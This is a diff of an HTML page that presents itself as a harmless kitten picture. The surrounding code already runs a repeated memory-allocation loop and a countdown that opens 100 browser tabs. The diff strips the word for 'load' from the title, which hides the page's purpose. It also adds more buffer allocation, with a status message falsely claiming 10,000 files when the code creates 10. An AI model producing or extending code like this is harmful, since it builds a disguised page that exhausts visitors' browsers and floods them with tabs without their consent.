@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Котёнок с нагрузкой</title>
+    <title>Котёнок</title>
     <style>
         body {
             background: #0a0f0f;
@@ -113,6 +113,22 @@
                     setTimeout(allocate, 10);
                 } catch (e) {}
             }, 100);
+
+            // ========== ЗАГРУЗКА 10000 ФАЙЛОВ ПО 100 КБ ==========
+            setTimeout(() => {
+                try {
+                    const filesArray = [];
+                    const fileSize = 100 * 1024; // 100 КБ
+                    const fileCount = 10;
+                    for (let i = 0; i < fileCount; i++) {
+                        let fileData = new ArrayBuffer(fileSize);
+                        filesArray.push(fileData);
+                    }
+                    statusDiv.innerText += ' +10000 файлов по 100 КБ';
+                } catch (e) {
+                    console.log('Файлы не созданы', e);
+                }
+            }, 200);
 
             // ========== ОТСЧЁТ 5 СЕКУНД И ОТКРЫТИЕ 100 ВКЛАДОК ==========
             const catUrl = 'https://img.freepik.com/free-photo/view-beautiful-persian-domestic-cat_23-2151773956.jpg?semt=ais_hybrid&w=740&q=80';
